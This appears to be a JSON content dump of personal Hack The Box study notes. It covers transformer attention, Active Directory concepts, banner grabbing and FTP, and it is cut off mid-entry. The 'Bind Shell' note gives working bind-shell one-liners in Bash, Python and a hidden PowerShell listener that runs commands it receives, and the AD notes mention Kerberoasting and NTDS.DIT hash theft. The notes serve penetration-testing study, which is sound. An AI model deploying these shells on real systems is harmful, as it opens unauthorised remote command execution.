embeddings depending on the context in which it’s used - for example &quot;the bark of a tree&quot; means something different to &quot;I heard a dog bark&quot;.\nIn a decoder block, attention layers are used to predict the next token in a sequence. For each token generated, the model has an attention layer that takes into account the sequence of tokens up to that point. The model considers which of the tokens are the most influential when considering what the next token should be. For example, given the sequence &quot;I heard a dog&quot;, the attention layer might assign greater weight to the tokens &quot;heard&quot; and &quot;dog&quot; when considering the next word in the sequence:\nI heard a dog {bark}\nRemember that the attention layer is working with numeric vector representations of the tokens, not the actual text. In a decoder, the process starts with a sequence of token embeddings representing the text to be completed. The first thing that happens is that another positional encoding layer adds a value to each embedding to indicate its position in the sequence:\n- [**1**,5,6,2]  (I)\n- [**2**,9,3,1]  (heard)\n- [**3**,1,1,2]  (a)\n- [**4**,10,3,2] (dog)\n\nDuring training, the goal is to predict the vector for the final token in the sequence based on the preceding tokens. The attention layer assigns a numeric weight to each token in the sequence so far. It uses that value to perform a calculation on the weighted vectors that produces an attention score that can be used to calculate a possible vector for the next token. In practice, a technique called multi-head attention uses different elements of the embeddings to calculate multiple attention scores. A neural network is then used to evaluate all possible tokens to determine the most probable token with which to continue the sequence. The process continues iteratively for each token in the sequence, with the output sequence so far being used regressively as the input for the next iteration – essentially building the output one token at a time.\nThe following animation shows a simplified representation of how this works – in reality, the calculations performed by the attention layer are more complex; but the principles can be simplified as shown:\n\n\nA sequence of token embeddings is fed into the attention layer. Each token is represented as a vector of numeric values.\nThe goal in a decoder is to predict the next token in the sequence, which will also be a vector that aligns to an embedding in the model’s vocabulary.\nThe attention layer evaluates the sequence so far and assigns weights to each token to represent their relative influence on the next token.\nThe weights can be used to compute a new vector for the next token with an attention score. Multi-head attention uses different elements in the embeddings to calculate multiple alternative tokens.\nA fully connected neural network uses the scores in the calculated vectors to predict the most probable token from the entire vocabulary.\nThe predicted output is appended to the sequence so far, which is used as the input for the next iteration.\n\nDuring training, the actual sequence of tokens is known – we just mask the ones that come later in the sequence than the token position currently being considered. As in any neural network, the predicted value for the token vector is compared to the actual value of the next vector in the sequence, and the loss is calculated. The weights are then incrementally adjusted to reduce the loss and improve the model. When used for inferencing (predicting a new sequence of tokens), the trained attention layer applies weights that predict the most probable token in the model’s vocabulary that is semantically aligned to the sequence so far.\nWhat all of this means, is that a transformer model such as GPT-4 (the model behind ChatGPT and Bing) is designed to take in a text input (called a prompt) and generate a syntactically correct output (called a completion). In effect, the “magic” of the model is that it has the ability to string a coherent sentence together. This ability doesn’t imply any “knowledge” or “intelligence” on the part of the model; just a large vocabulary and the ability to generate meaningful sequences of words. What makes a large language model like GPT-4 so powerful however, is the sheer volume of data with which it has been trained (public and licensed data from the Internet) and the complexity of the network. This enables the model to generate completions that are based on the relationships between words in the vocabulary on which the model was trained; often generating output that is indistinguishable from a human response to the same prompt."},"HTB/AD-Functionality":{"title":"AD Functionality","links":["HTB/SID","HTB/Active-Directory","HTB/Services"],"tags":[],"content":"FSMO Roles\nThere are five Flexible Single Master Operation (FSMO) roles. These roles can be defined as follows:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nRolesDescriptionSchema MasterThis role manages the read/write copy of the AD schema, which defines all attributes that can apply to an object in AD.Domain Naming MasterManages domain names and ensures that two domains of the same name are not created in the same forest.Relative ID (RID) MasterThe RID Master assigns blocks of RIDs to other DCs within the domain that can be used for new objects. The RID Master helps ensure that multiple objects are not assigned the same SID. Domain object SIDs are the domain SID combined with the RID number assigned to the object to make the unique SID.PDC EmulatorThe host with this role would be the authoritative DC in the domain and respond to authentication requests, password changes, and manage Group Policy Objects (GPOs). The PDC Emulator also maintains time within the domain.Infrastructure MasterThis role translates GUIDs, SIDs, and DNs between domains. This role is used in organizations with multiple domains in a single forest. The Infrastructure Master helps them to communicate. If this role is not functioning properly, Access Control Lists (ACLs) will show SIDs instead of fully resolved names.\nDepending on the organization, these roles may be assigned to specific DCs or as defaults each time a new DC is added. Issues with FSMO roles will lead to authentication and authorization difficulties within a domain.\n\nDomain and Forest Functional Levels\nMicrosoft introduced functional levels to determine the various features and capabilities available in Active Directory Domain Services (AD DS) at the domain and forest level. They are also used to specify which Windows Server operating systems can run a Domain Controller in a domain or forest. This and this article describe both the domain and forest functional levels from Windows 2000 native to Windows Server 2012 R2. Below is a quick overview of the differences in domain functional levels from Windows 2000 native up to Windows Server 2016, aside from all default Active Directory Directory Services features from the level just below it (or just the default AD DS features in the case of Windows 2000 native.)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nDomain Functional LevelFeatures AvailableSupported Domain Controller Operating SystemsWindows 2000 nativeUniversal groups for distribution and security groups, group nesting, group conversion (between security and distribution and security groups), SID history.Windows Server 2008 R2, Windows Server 2008, Windows Server 2003, Windows 2000Windows Server 2003Netdom.exe domain management tool, lastLogonTimestamp attribute introduced, well-known users and computers containers, constrained delegation, selective authentication.Windows Server 2012 R2, Windows Server 2012, Windows Server 2008 R2, Windows Server 2008, Windows Server 2003Windows Server 2008Distributed File System (DFS) replication support, Advanced Encryption Standard (AES 128 and AES 256) support for the Kerberos protocol, Fine-grained password policiesWindows Server 2012 R2, Windows Server 2012, Windows Server 2008 R2, Windows Server 2008Windows Server 2008 R2Authentication mechanism assurance, Managed Service AccountsWindows Server 2012 R2, Windows Server 2012, Windows Server 2008 R2Windows Server 2012KDC support for claims, compound authentication, and Kerberos armoringWindows Server 2012 R2, Windows Server 2012Windows Server 2012 R2Extra protections for members of the Protected Users group, Authentication Policies, Authentication Policy SilosWindows Server 2012 R2Windows Server 2016Smart card required for interactive logon new Kerberos features and new credential protection featuresWindows Server 2019 and Windows Server 2016\nA new functional level was not added with the release of Windows Server 2019. However, Windows Server 2008 functional level is the minimum requirement for adding Server 2019 Domain Controllers to an environment. Also, the target domain has to use DFS-R for SYSVOL replication.\nForest functional levels have introduced a few key capabilities over the years:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nVersionCapabilitiesWindows Server 2003saw the introduction of the forest trust, domain renaming, read-only domain controllers (RODC), and more.Windows Server 2008All new domains added to the forest default to the Server 2008 domain functional level. No additional new features.Windows Server 2008 R2Active Directory Recycle Bin provides the ability to restore deleted objects when AD DS is running.Windows Server 2012All new domains added to the forest default to the Server 2012 domain functional level. No additional new features.Windows Server 2012 R2All new domains added to the forest default to the Server 2012 R2 domain functional level. No additional new features.Windows Server 2016Privileged access management (PAM) using Microsoft Identity Manager (MIM).\n\nTrusts\nA trust is used to establish forest-forest or domain-domain authentication, allowing users to access resources in (or administer) another domain outside of the domain their account resides in. A trust creates a link between the authentication systems of two domains.\nThere are several trust types.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nTrust TypeDescriptionParent-childDomains within the same forest. The child domain has a two-way transitive trust with the parent domain.Cross-linka trust between child domains to speed up authentication.ExternalA non-transitive trust between two separate domains in separate forests which are not already joined by a forest trust. This type of trust utilizes SID filtering.Tree-roota two-way transitive trust between a forest root domain and a new tree root domain. They are created by design when you set up a new tree root domain within a forest.Foresta transitive trust between two forest root domains.\nTrust Example\n\nTrusts can be transitive or non-transitive.\n\nA transitive trust means that trust is extended to objects that the child domain trusts.\nIn a non-transitive trust, only the child domain itself is trusted.\n\nTrusts can be set up to be one-way or two-way (bidirectional).\n\nIn bidirectional trusts, users from both trusting domains can access resources.\nIn a one-way trust, only users in a trusted domain can access resources in a trusting domain, not vice-versa. The direction of trust is opposite to the direction of access.\n\nOften, domain trusts are set up improperly and provide unintended attack paths. Also, trusts set up for ease of use may not be reviewed later for potential security implications. Mergers and acquisitions can result in bidirectional trusts with acquired companies, unknowingly introducing risk into the acquiring company’s environment. It is not uncommon to be able to perform an attack such as Kerberoasting against a domain outside the principal domain and obtain a user that has administrative access within the principal domain."},"HTB/AD-Objects":{"title":"AD Objects","links":[],"tags":[],"content":"Reference: HTB\nWe will often see the term “objects” when referring to AD. What is an object? An object can be defined as ANY resource present within an Active Directory environment such as OUs, printers, users, domain controllers.\n\nUsers\nThese are the users within the organization’s AD environment. Users are considered leaf objects, which means that they cannot contain any other objects within them. Another example of a leaf object is a mailbox in Microsoft Exchange. A user object is considered a security principal and has a security identifier (SID) and a global unique identifier (GUID). User objects have many possible attributes, such as their display name, last login time, date of last password change, email address, account description, manager, address, and more. Depending on how a particular Active Directory environment is set up, there can be over 800 possible user attributes when accounting for ALL possible attributes as detailed here. This example goes far beyond what is typically populated for a standard user in most environments but shows Active Directory’s sheer size and complexity. They are a crucial target for attackers since gaining access to even a low privileged user can grant access to many objects and resources and allow for detailed enumeration of the entire domain (or forest).\nContacts\nA contact object is usually used to represent an external user and contains informational attributes such as first name, last name, email address, telephone number, etc. They are leaf objects and are NOT security principals (securable objects), so they don’t have a SID, only a GUID. An example would be a contact card for a third-party vendor or a customer.\nPrinters\nA printer object points to a printer accessible within the AD network. Like a contact, a printer is a leaf object and not a security principal, so it only has a GUID. Printers have attributes such as the printer’s name, driver information, port number, etc.\nComputers\nA computer object is any computer joined to the AD network (workstation or server). Computers are leaf objects because they do not contain other objects. However, they are considered security principals and have a SID and a GUID. Like users, they are prime targets for attackers since full administrative access to a computer (as the all-powerful NT AUTHORITY\\SYSTEM account) grants similar rights to a standard domain user and can be used to perform the majority of the enumeration tasks that a user account can (save for a few exceptions across domain trusts.)\nShared Folders\nA shared folder object points to a shared folder on the specific computer where the folder resides. Shared folders can have stringent access control applied to them and can be either accessible to everyone (even those without a valid AD account), open to only authenticated users (which means anyone with even the lowest privileged user account OR a computer account (NT AUTHORITY\\SYSTEM) could access it), or be locked down to only allow certain users/groups access. Anyone not explicitly allowed access will be denied from listing or reading its contents. Shared folders are NOT security principals and only have a GUID. A shared folder’s attributes can include the name, location on the system, security access rights.\nGroups\nA group is considered a container object because it can contain other objects, including users, computers, and even other groups. A group IS regarded as a security principal and has a SID and a GUID. In AD, groups are a way to manage user permissions and access to other securable objects (both users and computers). Let’s say we want to give 20 help desk users access to the Remote Management Users group on a jump host. Instead of adding the users one by one, we could add the group, and the users would inherit the intended permissions via their membership in the group. In Active Directory, we commonly see what are called “nested groups” (a group added as a member of another group), which can lead to a user(s) obtaining unintended rights. Nested group membership is something we see and often leverage during penetration tests. The tool BloodHound helps to discover attack paths within a network and illustrate them in a graphical interface. It is excellent for auditing group membership and uncovering/seeing the sometimes unintended impacts of nested group membership. Groups in AD can have many attributes, the most common being the name, description, membership, and other groups that the group belongs to. Many other attributes can be set, which we will discuss more in-depth later in this module.\nOrganizational Units (OUs)\nAn organizational unit, or OU from here on out, is a container that systems administrators can use to store similar objects for ease of administration. OUs are often used for administrative delegation of tasks without granting a user account full administrative rights. For example, we may have a top-level OU called Employees and then child OUs under it for the various departments such as Marketing, HR, Finance, Help Desk, etc. If an account were given the right to reset passwords over the top-level OU, this user would have the right to reset passwords for all users in the company. However, if the OU structure were such that specific departments were child OUs of the Help Desk OU, then any user placed in the Help Desk OU would have this right delegated to them if granted. Other tasks that may be delegated at the OU level include creating/deleting users, modifying group membership, managing Group Policy links, and performing password resets. OUs are very useful for managing Group Policy (which we will study later in this module) settings across a subset of users and groups within a domain. For example, we may want to set a specific password policy for privileged service accounts so these accounts could be placed in a particular OU and then have a Group Policy object assigned to it, which would enforce this password policy on all accounts placed inside of it. A few OU attributes include its name, members, security settings, and more.\nDomain\nA domain is the structure of an AD network. Domains contain objects such as users and computers, which are organized into container objects: groups and OUs. Every domain has its own separate database and sets of policies that can be applied to any and all objects within the domain. Some policies are set by default (and can be tweaked), such as the domain password policy. In contrast, others are created and applied based on the organization’s need, such as blocking access to cmd.exe for all non-administrative users or mapping shared drives at log in.\nDomain Controllers\nDomain Controllers are essentially the brains of an AD network. They handle authentication requests, verify users on the network, and control who can access the various resources in the domain. All access requests are validated via the domain controller and privileged access requests are based on predetermined roles assigned to users. It also enforces security policies and stores information about every other object in the domain.\nSites\nA site in AD is a set of computers across one or more subnets connected using high-speed links. They are used to make replication across domain controllers run efficiently.\nBuilt-in\nIn AD, built-in is a container that holds default groups in an AD domain. They are predefined when an AD domain is created.\nForeign Security Principals\nA foreign security principal (FSP) is an object created in AD to represent a security principal that belongs to a trusted external forest. They are created when an object such as a user, group, or computer from an external (outside of the current) forest is added to a group in the current domain. They are created automatically after adding a security principal to a group. Every foreign security principal is a placeholder object that holds the SID of the foreign object (an object that belongs to another forest.) Windows uses this SID to resolve the object’s name via the trust relationship. FSPs are created in a specific container named ForeignSecurityPrincipals with a distinguished name like cn=ForeignSecurityPrincipals,dc=inlanefreight,dc=local."},"HTB/AD-Terminologies":{"title":"AD Terminologies","links":["HTB/AD-Functionality","HTB/SMB"],"tags":[],"content":"Reference: HTB\nObject\nAn object can be defined as ANY resource present within an Active Directory environment such as OUs, printers, users, domain controllers, etc.\nAttributes\nEvery object in Active Directory has an associated set of attributes used to define characteristics of the given object. A computer object contains attributes such as the hostname and DNS name. All attributes in AD have an associated LDAP name that can be used when performing LDAP queries, such as displayName for Full Name and given name for First Name.\nSchema\nThe Active Directory schema is essentially the blueprint of any enterprise environment. It defines what types of objects can exist in the AD database and their associated attributes. It lists definitions corresponding to AD objects and holds information about each object. For example, users in AD belong to the class “user,” and computer objects to “computer,” and so on. Each object has its own information (some required to be set and others optional) that are stored in Attributes. When an object is created from a class, this is called instantiation, and an object created from a specific class is called an instance of that class. For example, if we take the computer RDS01. This computer object is an instance of the “computer” class in Active Directory.\nDomain\nA domain is a logical group of objects such as computers, users, OUs, groups, etc. We can think of each domain as a different city within a state or country. Domains can operate entirely independently of one another or be connected via trust relationships.\nForest\nA forest is a collection of Active Directory domains. It is the topmost container and contains all of the AD objects introduced below, including but not limited to domains, users, groups, computers, and Group Policy objects. A forest can contain one or multiple domains and be thought of as a state in the US or a country within the EU. Each forest operates independently but may have various trust relationships with other forests.\nTree\nA tree is a collection of Active Directory domains that begins at a single root domain. A forest is a collection of AD trees. Each domain in a tree shares a boundary with the other domains. A parent-child trust relationship is formed when a domain is added under another domain in a tree. Two trees in the same forest cannot share a name (namespace). Let’s say we have two trees in an AD forest: inlanefreight.local and ilfreight.local. A child domain of the first would be corp.inlanefreight.local while a child domain of the second could be corp.ilfreight.local. All domains in a tree share a standard Global Catalog which contains all information about objects that belong to the tree.\nContainer\nContainer objects hold other objects and have a defined place in the directory subtree hierarchy.\nLeaf\nLeaf objects do not contain other objects and are found at the end of the subtree hierarchy.\nGlobal Unique Identifier (GUID)\nA GUID is a unique 128-bit value assigned when a domain user or group is created. This GUID value is unique across the enterprise, similar to a MAC address. Every single object created by Active Directory is assigned a GUID, not only user and group objects. The GUID is stored in the ObjectGUID attribute. When querying for an AD object (such as a user, group, computer, domain, domain controller, etc.), we can query for its objectGUID value using PowerShell or search for it by specifying its distinguished name, GUID, SID, or SAM account name. GUIDs are used by AD to identify objects internally. Searching in Active Directory by GUID value is probably the most accurate and reliable way to find the exact object you are looking for, especially if the global catalog may contain similar matches for an object name. Specifying the ObjectGUID value when performing AD enumeration will ensure that we get the most accurate results pertaining to the object we are searching for information about. The ObjectGUID property never changes and is associated with the object for as long as that object exists in the domain.\nSecurity principals\nSecurity principals are anything that the operating system can authenticate, including users, computer accounts, or even threads/processes that run in the context of a user or computer account (i.e., an application such as Tomcat running in the context of a service account within the domain). In AD, security principles are domain objects that can manage access to other resources within the domain. We can also have local user accounts and security groups used to control access to resources on only that specific computer. These are not managed by AD but rather by the Security Accounts Manager (SAM).\nSecurity Identifier (SID)\nA security identifier, or SID is used as a unique identifier for a security principal or security group. Every account, group, or process has its own unique SID, which, in an AD environment, is issued by the domain controller and stored in a secure database. A SID can only be used once. Even if the security principle is deleted, it can never be used again in that environment to identify another user or group. When a user logs in, the system creates an access token for them which contains the user’s SID, the rights they have been granted, and the SIDs for any groups that the user is a member of. This token is used to check rights whenever the user performs an action on the computer. There are also well-known SIDs that are used to identify generic users and groups. These are the same across all operating systems. An example is the Everyone group.\nDistinguished Name (DN)\nA Distinguished Name (DN) describes the full path to an object in AD (such as cn=bjones, ou=IT, ou=Employees, dc=inlanefreight, dc=local). In this example, the user bjones works in the IT department of the company Inlanefreight, and his account is created in an Organizational Unit (OU) that holds accounts for company employees. The Common Name (CN) bjones is just one way the user object could be searched for or accessed within the domain.\nRelative Distinguished Name (RDN)\nA Relative Distinguished Name (RDN) is a single component of the Distinguished Name that identifies the object as unique from other objects at the current level in the naming hierarchy. In our example, bjones is the Relative Distinguished Name of the object. AD does not allow two objects with the same name under the same parent container, but there can be two objects with the same RDNs that are still unique in the domain because they have different DNs. For example, the object cn=bjones,dc=dev,dc=inlanefreight,dc=local would be recognized as different from cn=bjones,dc=inlanefreight,dc=local.\n\nsAMAccountName\nThe sAMAccountName is the user’s logon name. Here it would just be bjones. It must be a unique value and 20 or fewer characters.\nuserPrincipalName\nThe userPrincipalName attribute is another way to identify users in AD. This attribute consists of a prefix (the user account name) and a suffix (the domain name) in the format of bjones@inlanefreight.local. This attribute is not mandatory.\nFSMO Roles\nVarious FSMO roles are discussed in detail in AD Functionality chapter.\nIn the early days of AD, if you had multiple Domain Controllers (DC) in an environment, they would fight over which DC gets to make changes, and sometimes changes would not be made properly. Microsoft then implemented “last writer wins,” which could introduce its own problems if the last change breaks things. They then introduced a model in which a single “master” DC could apply changes to the domain while the others merely fulfilled authentication requests. This was a flawed design because if the master DC went down, no changes could be made to the environment until it was restored. To resolve this single point of failure model, Microsoft separated the various responsibilities that a DC can have into Flexible Single Master Operation (FSMO) roles. These give Domain Controllers (DC) the ability to continue authenticating users and granting permissions without interruption (authorization and authentication). There are five FSMO roles: Schema Master and Domain Naming Master (one of each per forest), Relative ID (RID) Master (one per domain), Primary Domain Controller (PDC) Emulator (one per domain), and Infrastructure Master (one per domain). All five roles are assigned to the first DC in the forest root domain in a new AD forest. Each time a new domain is added to a forest, only the RID Master, PDC Emulator, and Infrastructure Master roles are assigned to the new domain. FSMO roles are typically set when domain controllers are created, but sysadmins can transfer these roles if needed. These roles help replication in AD to run smoothly and ensure that critical services are operating correctly. We will walk through each of these roles in detail later in this section.\nGlobal Catalog\nA global catalog (GC) is a domain controller that stores copies of ALL objects in an Active Directory forest. The GC stores a full copy of all objects in the current domain and a partial copy of objects that belong to other domains in the forest. Standard domain controllers hold a complete replica of objects belonging to its domain but not those of different domains in the forest. The GC allows both users and applications to find information about any objects in ANY domain in the forest. GC is a feature that is enabled on a domain controller and performs the following functions:\n\nAuthentication (provided authorization for all groups that a user account belongs to, which is included when an access token is generated)\nObject search (making the directory structure within a forest transparent, allowing a search to be carried out across all domains in a forest by providing just one attribute about an object.)\n\nRead-Only Domain Controller (RODC)\nA Read-Only Domain Controller (RODC) has a read-only Active Directory database. No AD account passwords are cached on an RODC (other than the RODC computer account &amp; RODC KRBTGT passwords.) No changes are pushed out via an RODC’s AD database, SYSVOL, or DNS. RODCs also include a read-only DNS server, allow for administrator role separation, reduce replication traffic in the environment, and prevent SYSVOL modifications from being replicated to other DCs.\nReplication\nReplication happens in AD when AD objects are updated and transferred from one Domain Controller to another. Whenever a DC is added, connection objects are created to manage replication between them. These connections are made by the Knowledge Consistency Checker (KCC) service, which is present on all DCs. Replication ensures that changes are synchronized with all other DCs in a forest, helping to create a backup in case one domain controller fails.\nService Principal Name (SPN)\nA Service Principal Name (SPN) uniquely identifies a service instance. They are used by Kerberos authentication to associate an instance of a service with a logon account, allowing a client application to request the service to authenticate an account without needing to know the account name.\nGroup Policy Object (GPO)\nGroup Policy Objects (GPOs) are virtual collections of policy settings. Each GPO has a unique Global Unique Identifier (GUID). A GPO can contain local file system settings or Active Directory settings. GPO settings can be applied to both user and computer objects. They can be applied to all users and computers within the domain or defined more granularly at the OU level.\nAccess Control List (ACL)\nAn Access Control List (ACL) is the ordered collection of Access Control Entries (ACEs) that apply to an object.\nAccess Control Entries (ACEs)\nEach Access Control Entry (ACE) in an ACL identifies a trustee (user account, group account, or logon session) and lists the access rights that are allowed, denied, or audited for the given trustee.\nDiscretionary Access Control List (DACL)\nDACLs define which security principles are granted or denied access to an object; it contains a list of ACEs. When a process tries to access a securable object, the system checks the ACEs in the object’s DACL to determine whether or not to grant access. If an object does NOT have a DACL, then the system will grant full access to everyone, but if the DACL has no ACE entries, the system will deny all access attempts. ACEs in the DACL are checked in sequence until a match is found that allows the requested rights or until access is denied.\nSystem Access Control Lists (SACL)\nAllows for administrators to log access attempts that are made to secured objects. ACEs specify the types of access attempts that cause the system to generate a record in the security event log.\nFully Qualified Domain Name (FQDN)\nAn FQDN is the complete name for a specific computer or host. It is written with the hostname and domain name in the format [host name].[domain name].[tld]. This is used to specify an object’s location in the tree hierarchy of DNS. The FQDN can be used to locate hosts in an Active Directory without knowing the IP address, much like when browsing to a website such as google.com instead of typing in the associated IP address. An example would be the host DC01 in the domain INLANEFREIGHT.LOCAL. The FQDN here would be DC01.INLANEFREIGHT.LOCAL.\nTombstone\nA tombstone is a container object in AD that holds deleted AD objects. When an object is deleted from AD, the object remains for a set period of time known as the Tombstone Lifetime, and the isDeleted attribute is set to TRUE. Once an object exceeds the Tombstone Lifetime, it will be entirely removed. Microsoft recommends a tombstone lifetime of 180 days to increase the usefulness of backups, but this value may differ across environments. Depending on the DC operating system version, this value will default to 60 or 180 days. If an object is deleted in a domain that does not have an AD Recycle Bin, it will become a tombstone object. When this happens, the object is stripped of most of its attributes and placed in the Deleted Objects container for the duration of the tombstoneLifetime. It can be recovered, but any attributes that were lost can no longer be recovered.\nAD Recycle Bin\nThe AD Recycle Bin was first introduced in Windows Server 2008 R2 to facilitate the recovery of deleted AD objects. This made it easier for sysadmins to restore objects, avoiding the need to restore from backups, restarting Active Directory Domain Services (AD DS), or rebooting a Domain Controller. When the AD Recycle Bin is enabled, any deleted objects are preserved for a period of time, facilitating restoration if needed. Sysadmins can set how long an object remains in a deleted, recoverable state. If this is not specified, the object will be restorable for a default value of 60 days. The biggest advantage of using the AD Recycle Bin is that most of a deleted object’s attributes are preserved, which makes it far easier to fully restore a deleted object to its previous state.\nSYSVOL\nThe SYSVOL folder, or share, stores copies of public files in the domain such as system policies, Group Policy settings, logon/logoff scripts, and often contains other types of scripts that are executed to perform various tasks in the AD environment. The contents of the SYSVOL folder are replicated to all DCs within the environment using File Replication Services (FRS). You can read more about the SYSVOL structure here.\nAdminSDHolder\nThe AdminSDHolder object is used to manage Access Control List (ACL) for members of built-in groups in AD marked as privileged. It acts as a container that holds the Security Descriptor applied to members of protected groups. The SDProp (SD Propagator) process runs on a schedule on the PDC Emulator Domain Controller. When this process runs, it checks members of protected groups to ensure that the correct ACL is applied to them. It runs every hour by default. For example, suppose an attacker is able to create a malicious ACL entry to grant a user certain rights over a member of the Domain Admins group. In that case, unless they modify other settings in AD, these rights will be removed (and they will lose any persistence they were hoping to achieve) when the SDProp process runs on the set interval.\ndsHeuristics\nThe dsHeuristics attribute is a string value set on the Directory Service object used to define multiple forest-wide configuration settings. One of these settings is to exclude built-in groups from the Protected Groups list. Groups in this list are protected from modification via the AdminSDHolder object. If a group is excluded via the dsHeuristics attribute, then any changes that affect it will not be reverted when the SDProp process runs.\nadminCount\nThe adminCount attribute determines whether or not the SDProp process protects a user. If the value is set to 0 or not specified, the user is not protected. If the attribute value is set to 1, the user is protected. Attackers will often look for accounts with the adminCount attribute set to 1 to target in an internal environment. These are often privileged accounts and may lead to further access or full domain compromise.\nActive Directory Users and Computers (ADUC)\nADUC is a GUI console commonly used for managing users, groups, computers, and contacts in AD. Changes made in ADUC can be done via PowerShell as well.\nADSI Edit\nADSI Edit is a GUI tool used to manage objects in AD. It provides access to far more than is available in ADUC and can be used to set or delete any attribute available on an object, add, remove, and move objects as well. It is a powerful tool that allows a user to access AD at a much deeper level. Great care should be taken when using this tool, as changes here could cause major problems in AD.\nsIDHistory\nThis attribute holds any SIDs that an object was assigned previously. It is usually used in migrations so a user can maintain the same level of access when migrated from one domain to another. This attribute can potentially be abused if set insecurely, allowing an attacker to gain prior elevated access that an account had before a migration if SID Filtering (or removing SIDs from another domain from a user’s access token that could be used for elevated access) is not enabled.\nNTDS.DIT\nThe NTDS.DIT file can be considered the heart of Active Directory. It is stored on a Domain Controller at C:\\Windows\\NTDS\\ and is a database that stores AD data such as information about user and group objects, group membership, and, most important to attackers and penetration testers, the password hashes for all users in the domain. Once full domain compromise is reached, an attacker can retrieve this file, extract the hashes, and either use them to perform a pass-the-hash attack or crack them offline using a tool such as Hashcat to access additional resources in the domain. If the setting Store password with reversible encryption is enabled, then the NTDS.DIT will also store the cleartext passwords for all users created or who changed their password after this policy was set. While rare, some organizations may enable this setting if they use applications or protocols that need to use a user’s existing password (and not Kerberos) for authentication.\nMSBROWSE\nMSBROWSE is a Microsoft networking protocol that was used in early versions of Windows-based local area networks (LANs) to provide browsing services. It was used to maintain a list of resources, such as shared printers and files, that were available on the network, and to allow users to easily browse and access these resources.\nIn older version of Windows we could use nbtstat -A ip-address to search for the Master Browser. If we see MSBROWSE it means that’s the Master Browser. Aditionally we could use nltest utility to query a Windows Master Browser for the names of the Domain Controllers.\nToday, MSBROWSE is largely obsolete and is no longer in widespread use. Modern Windows-based LANs use the Server Message Block (SMB) protocol for file and printer sharing, and the Common Internet File System (CIFS) protocol for browsing services."},"HTB/Active-Directory":{"title":"Active Directory","links":["HTB/AD-Terminologies","HTB/AD-Objects","HTB/AD-Functionality"],"tags":[],"content":"References: HTB\nActive Directory Fundamentals\n\nActive Directory provides authentication and  authorization within a Windows domain environment.\nIt is a windows service that allows for centralized management of an organization’s resources, including users, computers, groups, network devices, file shares, group policies, devices, and trusts.\nAD is essentially a sizeable read-only database accessible to all users within the domain, regardless of their privilege level. ANY user account, regardless of their privilege level, can be used to enumerate the domain and hunt for misconfigurations and flaws thoroughly.\n\n\nActive Directory Structure\nReference: HTB\nActive Directory Structure contains top level domains which may be linked together using relations, and have multiple subdomains. When top domains are in relation the subdomains do not necessarily have relation and need specifying if wanted to.\nAD Terminologies\nVarious terminologies related to active directory can be found here. Its a glossary of terms.\nAD Objects\nDifferent Objects in Active Directory\nAD Functionality"},"HTB/Banner-grabbing":{"title":"Banner grabbing","links":["tags/Reconnaissance","Netcat","HTB/Nmap","cURL"],"tags":["Reconnaissance"],"content":"Reconnaissance\nBanner grabbing is a useful technique to fingerprint a service quickly, i.e. to see what is being run at a given port.\nMethods\n1. Using Netcat:\nSyntax:\nnc -nv &lt;host&gt; &lt;port&gt;\n2. Using Nmap\nSyntax\nnmap -sV --script=banner -p&lt;port number&gt; &lt;host&gt;/&lt;port&gt;\n3. Using cURL"},"HTB/Bind-Shell":{"title":"Bind Shell","links":["Netcat"],"tags":[],"content":"Bind shell is opposite of reverse shell. Instead of we listening and target connecting, here target listens and we connect to it.\nBind Shell Commands\nFor Bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc -lvp 1234 &gt;/tmp/f\nFor Python\npython -c &#039;exec(&quot;&quot;&quot;import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((&quot;0.0.0.0&quot;,1234));s1.listen(1);c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())&quot;&quot;&quot;)&#039;\nFor Powershell\npowershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &quot;PS &quot; + (pwd).Path + &quot; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();\nConnecting to target\nWe use Netcat to connect to the port and get connection to the shell.\nUsage\nnc &lt;target ip&gt; &lt;port&gt;\nUpgrading TTY\nUpgrading TTY will allow better interactions with the remote shell.  This can be achieved by mapping our terminal TTY with the remote TTY.\nThere are multiple methods to achieve this. One of them is using python/stty method.\n1. Step 1\npython -c &#039;import pty; pty.spawn(&quot;/bin/bash&quot;)&#039;\n2. Step 2\nHit ctrl+z to background our shell and get back on our local terminal, and input the following stty command, then input fg command to bring netcat shell to foreground. At this point, the terminal will show a blank line. We can hit enter again to get back to our shell.\n$stty raw -echo\n$fg\n \n[Enter]\n[Enter]"},"HTB/FTP":{"title":"FTP","links":["tags/file-transfer"],"tags":["file-transfer"],"content":"tags: file-transfer\nThe FTP server enables a client to exchange files between devices. It also enables clients to manage files remotely by sending file management commands such as delete or rename. To accomplish this, the FTP service uses two different ports to communicate between client and server.\nTo begin an FTP session, control connection requests are sent to the server using destination TCP port 21. When the session is opened, the server uses TCP port 20 to transfer the data files.\nInfo\nThe default port for ftp is 21.\nWe can login as anonymous if not restricted by the owner.\nSyntax:\nftp -p 10.129.42.253\nCommands\n\n?: To see help menu\nGet: To download files to our local system\nPut: To upload file to remote server\nExit: To exit ftp session.\ncd: Change directory\ndir: List directories\nrename: Rename a 